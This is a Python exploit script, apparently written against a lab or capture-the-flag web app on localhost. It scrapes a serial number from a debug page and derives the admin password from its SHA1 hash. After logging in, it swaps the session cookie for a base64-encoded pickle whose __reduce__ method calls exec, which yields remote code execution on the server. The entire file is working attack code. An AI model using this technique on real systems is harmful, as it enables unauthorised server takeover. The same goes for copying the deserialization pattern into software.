import pickle
import base64
import requests
import hashlib
import time

exec_str = "f = open('system_gateway.log', 'w'); f.write(f'Exploit token: {}\\nSucessfully exploited the server from {{request.remote_addr}}\\n'); f.write(f'Exploit is executing as {{os.getlogin()}}\\n'); f.close();"

class Session(object):
    cmd = "print('hello world')"
    def __reduce__(self):
        return (exec, (self.cmd, ))

def gen_payload_from_cookie(cmd):
    o = Session()
    o.cmd = cmd
    #o = pickle.dumps(o)
    return base64.b64encode(pickle.dumps(o)).decode("utf-8")


def strip_pre(text):
    res = []
    for i in text.split("\n"):
        i = i.strip()
        if "<pre id=\"logs\">" in i:
            res.append(i.replace("<pre id=\"logs\">", ""))
            continue
        if res:
            if "</pre>" in i:
                res.append(i.replace("</pre>", ""))
                break
            res.append(i)
    return "\n".join(res)

def exploit(server, cmd="whoami"):
    # Stage one, get the serial number and generate the admin password based on that
    print("[*] Getting serial number from " + server + "debug")
    r = requests.get(server + "debug")
    serial_number = ""
    for line in r.text.split("\n"):
        if "Serial Number" in line:
            line = line.replace("<", ">").split(">")
            serial_number = line[8]
            print(f"[+] Serial Number: {serial_number}")
    
    if serial_number == "":
        print("[!] Could not scrape serial number")
        return

    password = hashlib.sha1(serial_number.encode()).hexdigest()
    password = password.upper()[:10]
    print(f'[+] Derived admin password: {password}')
    print("[*] Logging in to get auth token")
    with requests.Session() as s:
        r = s.post(server + "login", data={"username": "admin", "password": password})
        auth_token = s.cookies.get("auth_token")
        if not auth_token:
            print("[!] Failed to get session cookie")
            return
        random_tok = str(int(time.time()))
        new_token = gen_payload_from_cookie(exec_str.format(random_tok))
        s.cookies.set("auth_token", new_token)
        print(f"[*] Generated exploit token: {new_token}")
        s.get(server)
        r = s.get(server+"debug")
        result = strip_pre(r.text)
        if random_tok not in result:
            print("[!] Exploit failed. No result in the logs")
            return
        print("[+] Exploit succeeded. Printing execution output.\n")
        print(result)

def main():
    exploit("http://localhost:5000/")

if __name__ == "__main__":
    main()